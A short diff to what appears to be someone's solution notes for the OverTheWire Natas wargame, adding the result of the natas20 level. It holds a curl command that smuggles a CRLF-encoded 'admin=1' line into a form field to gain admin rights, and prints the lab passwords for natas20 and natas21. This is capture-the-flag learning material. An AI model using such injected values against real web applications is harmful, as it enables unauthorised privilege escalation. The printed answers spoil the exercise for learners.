@@ -112,3 +112,6 @@ Username: natas20
 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
 curl -s -d "name=user%0d%0aadmin=1" --user natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF -b cookie.txt -X POST http://natas20.natas.labs.overthewire.org?debug | sed s/\<br\>/\\n/g | grep -A 20 content
+You are an admin. The credentials for the next level are:
+<pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
